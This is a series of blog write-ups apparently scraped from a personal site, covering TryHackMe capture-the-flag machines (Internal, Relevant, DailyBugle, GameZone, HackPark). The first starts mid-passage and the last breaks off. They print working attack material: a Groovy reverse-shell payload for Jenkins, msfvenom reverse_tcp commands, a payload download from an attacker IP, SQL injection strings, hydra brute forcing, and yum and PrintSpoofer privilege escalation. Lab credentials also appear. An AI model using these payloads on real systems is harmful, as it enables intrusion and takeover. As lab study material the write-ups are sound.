Template, from there you can remove the php code, and plant your php reverse shell:\nFrom there I started my listener and got the reverse shell:\nNow that I am in I went to the opt folder and discovered these credentials:\n1 2 3 4 5 6 7 meterpreter \u0026gt; cat wp-save.txt Bill, Aubreanna needed these credentials for something later. Let her know you have them and where they are. aubreanna:bubb13guM!@#123 So I entered from ssh:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ssh aubreanna@10.10.186.60 aubreanna@10.10.186.60\u0026#39;s password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Dec 31 21:32:39 UTC 2023 System load: 0.0 Processes: 114 Usage of /: 63.8% of 8.79GB Users logged in: 0 Memory usage: 44% IP address for eth0: 10.10.186.60 Swap usage: 0% IP address for docker0: 172.17.0.1 =\u0026gt; There is 1 zombie process. * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 0 packages can be updated. 0 updates are security updates. Last login: Mon Aug 3 19:56:19 2020 from 10.6.2.56 aubreanna@internal:~$ Here we can retrieve the user.txt flag, and we can also see that there is a jenkins server running in 172.17.0.2:8080\nSo I made a ssh tunnel using:\n1 ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.186.60 And from there we have a tunnel.\nNow we can simply go to localhost:8080 and we are in the login page for jenkins.\nFrom there I try to brute force the login page using ZAP.\nAs you can see I got a request much different from the others, often that means that we have what we want.\nNow that we are into Jenkins we just need to go to the script console, and writing this:\n1 2 3 4 5 6 Thread.start { String host=\u0026#34;\u0026lt;your_machine_IP\u0026gt;\u0026#34;; int port=\u0026lt;your_webserver_port\u0026gt;; String cmd=\u0026#34;cmd.exe\u0026#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); } cmd.exe if is windows, /bin/bash if is linux.\nAnd start the listener in our machine.\nNow that we are inside the machine we can go into the opt folder again and take the root credentials:\n1 2 3 4 5 6 7 cat note.txt Aubreanna, Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you need access to the root user account. root:tr0ub13guM!@#123 ","date":"2024-01-01T18:00:00+01:00","image":"https://images.unsplash.com/photo-1495592822108-9e6261896da8?q=80\u0026w=2670\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://simonefelici.github.io/p/internal-writeup-thm/","title":"Internal Writeup THM"},{"content":"The first thing that I have done, using nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 nmap 10.10.91.208 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 06:18 EST Nmap scan report for 10.10.91.208 Host is up (0.076s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Nmap done: 1 IP address (1 host up) scanned in 11.68 seconds 80: Web page 135: msrpc 139: NetBios 445: Samba 3389: rdp From there I can see that the machine is running windows.\nThe interessing ports are 80 and 445.\nFirst of all I am just going to explolre the web page.\nFrom the web page we can see that it uses IIS as a web server, which can be really helpfull, but for now I am going to search other things, like, samba enumeration:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.91.208 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 06:28 EST Nmap scan report for 10.10.91.208 Host is up (0.067s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.91.208\\ADMIN$: | Type: STYPE_DISKTREE_HIDDEN | Comment: Remote Admin | Anonymous access: \u0026lt;none\u0026gt; | Current user access: \u0026lt;none\u0026gt; | \\\\10.10.91.208\\C$: | Type: STYPE_DISKTREE_HIDDEN | Comment: Default share | Anonymous access: \u0026lt;none\u0026gt; | Current user access: \u0026lt;none\u0026gt; | \\\\10.10.91.208\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: Remote IPC | Anonymous access: \u0026lt;none\u0026gt; | Current user access: READ/WRITE | \\\\10.10.91.208\\nt4wrksv: | Type: STYPE_DISKTREE | Comment: | Anonymous access: \u0026lt;none\u0026gt; |_ Current user access: READ/WRITE Nmap done: 1 IP address (1 host up) scanned in 36.80 seconds Here I found out a shared folder called nt4wrksv, which can be a user.\nAnd when I tried to enter this folder I was able to do that even without a password.\n1 2 3 4 5 6 7 8 9 10 smbclient //10.10.91.208/nt4wrksv Password for [WORKGROUP\\kali]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Dec 31 06:28:38 2023 .. D 0 Sun Dec 31 06:28:38 2023 passwords.txt A 98 Sat Jul 25 11:15:33 2020 7735807 blocks of size 4096. 5136298 blocks available I even found a passwords.txt file that I downloaded in my machine to examine\n1 2 3 4 5 cat passwords.txt [User Passwords - Encoded] Qm9iIC0gIVBAJCRXMHJEITEyMw== QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk There are two encoded passwords.\nthe first one is encoded in base64:\n1 Bob - !P@$$W0rD!123 And it actually is username and password.\nThe second one is:\n1 Bill - Juw4nnaM4n420696969!$$$ So, now we have two usernames with password.\nUnfortunately they don’t work with the other samba folders.\nSo for now I am just going to switch target.\nI tried using the rdp but even then I couldn’t enter.\nSo now I am going to try to enumerate the directories in the web page.\nThis didn’t go well.\nSo I went and searched for the version of IIS.\nUsing burp I intercepted the request and found this:\n1 Server: Microsoft-IIS/10.0 So now that we know the version I am going to search online for some know vulnerabilities.\nAt this point it was clear that I was doing something wrong, so I went back and did another scan, this time with all the ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 nmap -p- -A 10.10.161.53 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 07:22 EST Nmap scan report for 10.10.161.53 Host is up (0.057s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=Relevant | Not valid before: 2023-12-30T12:20:08 |_Not valid after: 2024-06-30T12:20:08 |_ssl-date: 2023-12-31T12:27:21+00:00; -1s from scanner time. | rdp-ntlm-info: | Target_Name: RELEVANT | NetBIOS_Domain_Name: RELEVANT | NetBIOS_Computer_Name: RELEVANT | DNS_Domain_Name: Relevant | DNS_Computer_Name: Relevant | Product_Version: 10.0.14393 |_ System_Time: 2023-12-31T12:26:41+00:00 49663/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h36m00s, deviation: 3h34m42s, median: -1s | smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) | Computer name: Relevant | NetBIOS computer name: RELEVANT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-12-31T04:26:46-08:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2023-12-31T12:26:42 |_ start_date: 2023-12-31T12:20:09 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 265.81 seconds And I got other 3 ports.\nFirst thing that I am going to do is trying open the other web page:\nWhich is the same as the other.\nApart that this time I can enter the nt4wrksv directory that I have found in the samba share. (http://10.10.161.53:49663/nt4wrksv)\nfrom the web page I can also access the passwords.txt file. (http://10.10.161.53:49663/nt4wrksv/passwords.txt)\nAnd having the privilege to put file using smbclient I was able to open a reverse shell using:\n1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.18.20.116 LPORT=4555 -f aspx -o rev.aspx Putting it in the nt4wrksv shared folder, opening a listener inside metasploit, and navigate in that directory in the browser. (http://10.10.161.53:49663/nt4wrksv/rev.aspx)\nSo now I got a reverse shell.\n1 2 3 getuid Server username: IIS APPPOOL\\DefaultAppPool First of all I am going to retrieve the flag inside the Bob directory: THM{fdk4ka34vk346ksxfr21tg789ktf45}\nNow that I am in I can see the privileges using whoami /priv.\nI see that I the SeImpersonatePrivilege is Enabled. So I am going to exploit that.\nI will do it using PrintSpoofer64.exe.\nWhich is a tool that can exploit this vulnerability.\n1 2 3 4 5 6 7 8 9 10 11 PrintSpoofer64.exe -i -c powershell [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u0026gt; whoami whoami nt authority\\system And just like that I retrieved the flag in the administrator desktop: THM{1fk5kf469devly1gl320zafgl345pv}\nRelevant Report\n","date":"2024-01-01T13:00:00+01:00","image":"https://images.unsplash.com/photo-1598662779094-110c2bad80b5?q=80\u0026w=2146\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://simonefelici.github.io/p/relevant-writeup-thm/","title":"Relevant Writeup THM"},{"content":"The first thing that we are going to do is a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 sudo nmap -A 10.10.62.253 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-30 10:48 EST Nmap scan report for 10.10.62.253 Host is up (0.063s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA) | 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA) |_ 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.6.40) |_http-generator: Joomla! - Open Source Content Management | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40 3306/tcp open mysql MariaDB (unauthorized) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). This is our output, we see that there are 3 ports open,\nssh(useless for now) http 3306, which is used by MariaDB The first thing that I am going to do is exploring the web page\nAfter trying some thing, I cam accross the robots.txt directory:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # http://www.robotstxt.org/orig.html # # For syntax checking, see: # http://tool.motoricerca.info/robots-checker.phtml User-agent: * Disallow: /administrator/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/ This is the output.\nFor now I am going to ignore it.\nNow I just started sqlmap with the request that I captured from the login form:\n1 └─$ sqlmap -r Desktop/response.txt --dbms=mariadb --dump --threads=5 And then I ran ffuf for directory enumeration:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 ffuf -u http://10.10.62.253/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.62.253/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htpasswd [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5237ms] .htaccess [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5361ms] administrator [Status: 301, Size: 242, Words: 14, Lines: 8, Duration: 80ms] bin [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 79ms] cache [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 80ms] cgi-bin/ [Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 80ms] cli [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 82ms] components [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 94ms] images [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 76ms] includes [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 79ms] language [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 80ms] layouts [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 80ms] libraries [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 77ms] media [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 79ms] modules [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 80ms] plugins [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 79ms] robots.txt [Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 80ms] templates [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 71ms] tmp [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 80ms] :: Progress: [20469/20469] :: Job [1/1] :: 265 req/sec :: Duration: [0:00:51] :: Errors: 0 :: Ok, now that I have more informations, I can visit the administrator page:\nNice, we have the jomla login panel.\nNow we can run OWASP joomscan, and find the version.\nAfter that I searched for an exploit, and found this python script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 python3 joomblah.py http://10.10.62.253 .---. .-\u0026#39;\u0026#39;\u0026#39;-. .-\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39; _ \\ \u0026#39; _ \\ .---. \u0026#39;---\u0026#39; / /` \u0026#39;. \\ / /` \u0026#39;. \\ __ __ ___ /| | | . .---.. | \\ \u0026#39; . | \\ \u0026#39; | |/ `.\u0026#39; `. || | | .\u0026#39;| | || \u0026#39; | \u0026#39;| \u0026#39; | \u0026#39;| .-. .-. \u0026#39;|| | | \u0026lt; | | |\\ \\ / / \\ \\ / / | | | | | ||| __ | | __ | | | | `. ` ..\u0026#39; / `. ` ..\u0026#39; / | | | | | |||/\u0026#39;__ \u0026#39;. | | .:--.\u0026#39;. | | .\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39;-...-\u0026#39;` \u0026#39;-...-\u0026#39;` | | | | | ||:/` \u0026#39;. \u0026#39;| |/ | \\ | | |/.\u0026#39;\u0026#39;\u0026#39;. \\ | | | | | | | ||| | || |`\u0026#34; __ | | | / | | | | |__| |__| |__|||\\ / \u0026#39;| | .\u0026#39;.\u0026#39;\u0026#39;| | | | | | __.\u0026#39; \u0026#39; |/\u0026#39;..\u0026#39; / \u0026#39;---\u0026#39;/ / | |_| | | | | \u0026#39; \u0026#39; `\u0026#39;-\u0026#39;` \\ \\._,\\ \u0026#39;/| \u0026#39;. | \u0026#39;. |____.\u0026#39; `--\u0026#39; `\u0026#34; \u0026#39;---\u0026#39; \u0026#39;---\u0026#39; [-] Fetching CSRF token [-] Testing SQLi - Found table: \u0026lt;redacted\u0026gt; - Extracting users from \u0026lt;redacted\u0026gt; [$] Found user [\u0026#39;\u0026lt;redacted\u0026gt;\u0026#39;] - Extracting sessions from \u0026lt;redacted\u0026gt; After finding the hash of Jonah, I just went to hashidentifier and cracked it.\nNow for creating a reverse shell I found this Article online: https://www.hackingarticles.in/joomla-reverse-shell/\nI followed and I got a rev shell.\nI upgraded the shell using:\n1 python -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; And found the jjameson’s password inside linpeas.\nNow we need to become root.\nI used sudo -l to list all the privileges:\n1 2 3 4 5 6 7 8 9 10 11 12 13 sudo -l Matching Defaults entries for jjameson on dailybugle: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User jjameson may run the following commands on dailybugle: (ALL) NOPASSWD: /usr/bin/yum And then went to gtfobins and used this for a root shell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 TF=$(mktemp -d) cat \u0026gt;$TF/x\u0026lt;\u0026lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat \u0026gt;$TF/y.conf\u0026lt;\u0026lt;EOF [main] enabled=1 EOF cat \u0026gt;$TF/y.py\u0026lt;\u0026lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=\u0026#39;2.1\u0026#39; def init_hook(conduit): os.execl(\u0026#39;/bin/sh\u0026#39;,\u0026#39;/bin/sh\u0026#39;) EOF sudo yum -c $TF/x --enableplugin=y ","date":"2024-01-01T10:00:00+01:00","image":"https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled.png","permalink":"https://simonefelici.github.io/p/dailybugle-writeup-thm/","title":"DailyBugle Writeup THM"},{"content":"We are going to startwith a scan:\n1 2 3 4 5 6 7 8 9 10 11 12 nmap \u0026lt;your_ip\u0026gt; Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 10:50 EST Nmap scan report for 10.10.108.222 Host is up (0.060s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 259/tcp filtered esro-gen Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds First of all we access the web page and see the hitman,\nif you don’t know his name, just use google images.\nThen we see a login page, and try using SQLi\nWe do this by adding ' or 1=1 — - instead of the username\nBy doing this we can access the site.\nNow we are going to use sqlmap to dump the entire database!\nBefore that we need to capture the request with burp.\nYou can do that just by\nactivating the proxy, capturing the request in the game zone portal copy it into a txt file, And put it into sqlmap like that: 1 sqlmap -r request.txt --dbms=mysql --dump --threads=5 Now that we have a username and password, I am going to use ssh.\nThen we will use a tool called ss to investigate sockets running on a host.\nIf we run ss -tulpn it will tell us what socket connections are running\nArgument Description -t Display TCP sockets -u Display UDP sockets -l Displays only listening sockets -p Shows the process using the socket -n Doesn\u0026rsquo;t resolve service names We see that is running a servvice on port 10000 but is filtered by the firewall.\nSo we go back to our machine and run ssh -L 10000:localhost:10000 \u0026lt;username\u0026gt;@\u0026lt;ip\u0026gt;\nOnce we are in we can open our browser and go to localhost:1000,\nhere we are met with a login page.\nI just use the credential that we altready have and they worked.\nAfter that we just need to use metasploit, to search the exploit and run it using the options that he wants.\nI’ve tried for long enough to make it work but I didn’t succeded,\nin the end I searched in Exploit DB and read what the exploit does, I found out that it just allows you to exeute arbitrary commands in the /file/show.cgi component\nViewing the hint I know that the flag is in root.txt, so I just had to do this:\n1 http://localhost:10000/file/show.cgi/root/root.txt ","date":"2023-12-28T18:00:00+01:00","image":"https://images.unsplash.com/photo-1483335584694-fb0f729b0f9c?q=80\u0026w=2072\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://simonefelici.github.io/p/gamezone-writeup-thm/","title":"GameZone Writeup THM"},{"content":"First of all I am going to do a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 nmap -Pn \u0026lt;Machine IP\u0026gt; Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2023-12-28 05:20 EST Nmap scan report for 10.10.100.75 Host is up (0.054s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3389/tcp open ms-wbt-server Nmap done: 1 IP address (1 host up) scanned in 5.97 seconds I have usend -Pn because the machine does not respond to ping.\nWe can see that it has port 80(web page) and port 3389(rdp) open.\nFor now I am just going to see the web page.\nFrom here I can do a reverse image research with google images to uncover the clown identity!\n1 2 3 4 5 6 7 8 9 10 hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt \u0026lt;Machine_IP\u0026gt; http-post-form \u0026#34;/Account/login.aspx?ReturnURL=%2fadmin%2f?ReturnURL=/admin/:__VIEWSTATE=EOQdZQUirRo%2FPUM0GeZEHUCUj2T4rRAdTaQhFI1ySIpm9C8mzxvnNNrRnjAQpjhVlBKOWm1gYZ35tUhQtBunvQ4xbDH%2B0tCVubOn7duj0udoaup%2BbQ5ohSDr%2FkR3znBlND9uVF6IyceARqKMmH7Lr6Ybud38aeXVlK%2FHUbFoRC7QG7j2SmTr2Yo2DP9Z8iuvNgq3V%2F6TWN9zRuY5L41FLVK4aRfYv2wwJyCsYpMBCqqxwwbKVvzuKrxaztrLzQzW7yYMpMYMVupE4S6NoZ%2BI3eAoSEOX9EYCmHNJo7ArRyHf6NaUD4ziHK02Fxf7zNrhsEv6eMLzKY%2FwxcNNYPtZmPZraazfs5Eak1UrAb4bcd%2F5U674\u0026amp;__EVENTVALIDATION=vv0szo0PNWcBRD3S8W58LlYPikRW%2B87zibRx%2F2E7pAtvEDnvbhdcw%2FwUE3c9c3MRswdhWJXJYFE%2Ff4zg9IxkwN13iQf3WP6ILJMuG5mkvCeF1g9rdSkXPBc5%2FKAUY2e4duaTxrTr4klY8YZ4bVhdDhot4KoE7a8pfuEkc1chGV1n%2B4Iv\u0026amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^\u0026amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed” Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 05:43:08 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task [DATA] attacking http-post-form://10.10.100.75:80/Account/login.aspx?ReturnURL=%2fadmin%2f?ReturnURL=/admin/:__VIEWSTATE=EOQdZQUirRo%2FPUM0GeZEHUCUj2T4rRAdTaQhFI1ySIpm9C8mzxvnNNrRnjAQpjhVlBKOWm1gYZ35tUhQtBunvQ4xbDH%2B0tCVubOn7duj0udoaup%2BbQ5ohSDr%2FkR3znBlND9uVF6IyceARqKMmH7Lr6Ybud38aeXVlK%2FHUbFoRC7QG7j2SmTr2Yo2DP9Z8iuvNgq3V%2F6TWN9zRuY5L41FLVK4aRfYv2wwJyCsYpMBCqqxwwbKVvzuKrxaztrLzQzW7yYMpMYMVupE4S6NoZ%2BI3eAoSEOX9EYCmHNJo7ArRyHf6NaUD4ziHK02Fxf7zNrhsEv6eMLzKY%2FwxcNNYPtZmPZraazfs5Eak1UrAb4bcd%2F5U674\u0026amp;__EVENTVALIDATION=vv0szo0PNWcBRD3S8W58LlYPikRW%2B87zibRx%2F2E7pAtvEDnvbhdcw%2FwUE3c9c3MRswdhWJXJYFE%2Ff4zg9IxkwN13iQf3WP6ILJMuG5mkvCeF1g9rdSkXPBc5%2FKAUY2e4duaTxrTr4klY8YZ4bVhdDhot4KoE7a8pfuEkc1chGV1n%2B4Iv\u0026amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^\u0026amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed [80][http-post-form] host: 10.10.100.75 login: admin password: \u0026lt;redacted\u0026gt; 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-28 05:44:04 Found the password!\nNow we need to get a reverse shell, this can be done by searching in exploit DB using the database version in http://10.10.100.75/admin/about.cshtml\nAfter we install the exploit, we need to change the attacker ip and port to ours\n1 using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(\u0026#34;\u0026lt;YOUR_IP\u0026gt;\u0026#34;, \u0026lt;YOUR_PORT\u0026gt;)) { Then we rename the file into PostView.ascx\nAfter that we set up a listener:\n1 nc -lvnp 4444 And we go to publish it\nAfter that we just want to go to this path: http://10.10.10.10/?theme=../../App_Data/files for triggering the reverse shell!\nNow, we want to upgrade the shell using metasploit.\nFirst of all we create our revshell:\n1 msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;YOUR_IP\u0026gt; LPORT=4555 -f exe -o revshell.exe then we set up our listener inside metasploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target View the full module info with the info, or info -d command. msf6 exploit(multi/handler) \u0026gt; set LHOST \u0026lt;YOUR_IP\u0026gt; LHOST =\u0026gt; \u0026lt;YOUR_IP\u0026gt; msf6 exploit(multi/handler) \u0026gt; set LPORT 4555 LPORT =\u0026gt; 4555 Then we create a server using python:\npython3 -m http.server 8000\nAfter that we need to install the reverse shell inside the windows machine,\nWe need to do this inside the temp folder, otherwise is not going to work:\n1 powershell Invoke-WebRequest -Uri http://10.18.20.116:8000/revshell.exe -OutFile revshell.exe Then we execute the file and we have the shell!\nnow we need to search for the OS, we just need to use sysinfo\nAnd for the processes ps\nThe hint tells us to check “C:\\Program Files (x86)”\nSo I did:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 c:\\Program Files (x86)\u0026gt;dir Volume in drive C has no label. Volume Serial Number is 0E97-C552 Directory of c:\\Program Files (x86) 08/06/2019 01:12 PM \u0026lt;DIR\u0026gt; . 08/06/2019 01:12 PM \u0026lt;DIR\u0026gt; .. 08/22/2013 07:39 AM \u0026lt;DIR\u0026gt; Common Files 03/21/2014 11:07 AM \u0026lt;DIR\u0026gt; Internet Explorer 08/22/2013 07:39 AM \u0026lt;DIR\u0026gt; Microsoft.NET 12/28/2023 04:49 AM \u0026lt;DIR\u0026gt; SystemScheduler 08/22/2013 07:39 AM \u0026lt;DIR\u0026gt; Windows Mail 08/22/2013 07:39 AM \u0026lt;DIR\u0026gt; Windows NT 08/22/2013 07:39 AM \u0026lt;DIR\u0026gt; WindowsPowerShell 0 File(s) 0 bytes 9 Dir(s) 39,124,586,496 bytes free The only thing strange to me is SystemScheduler, if we open the directory, we can see a bunch of processes.\nGoing in the Events, directory, and opening the log file, will reval to us which is the abnormal service that is running.\nWe see that the service Message.exe run with the Administrator privileges, 